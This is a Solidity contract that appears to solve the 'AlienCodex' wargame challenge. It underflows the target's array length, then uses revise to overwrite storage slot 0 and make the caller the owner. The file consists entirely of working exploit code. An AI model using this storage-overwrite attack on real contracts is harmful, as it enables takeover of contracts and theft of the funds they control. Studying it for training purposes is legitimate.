// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract AlienCodexHack {
    IAlienCodex private immutable target;

    constructor(address _target) {
        target = IAlienCodex(_target);
        target.makeContact();
        target.retract();
        uint256 arrayLengthSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 ownerSlot;
        unchecked {
            ownerSlot -= arrayLengthSlot;
        }
        target.revise(ownerSlot, bytes32(uint256(uint160(msg.sender))));
    }
}
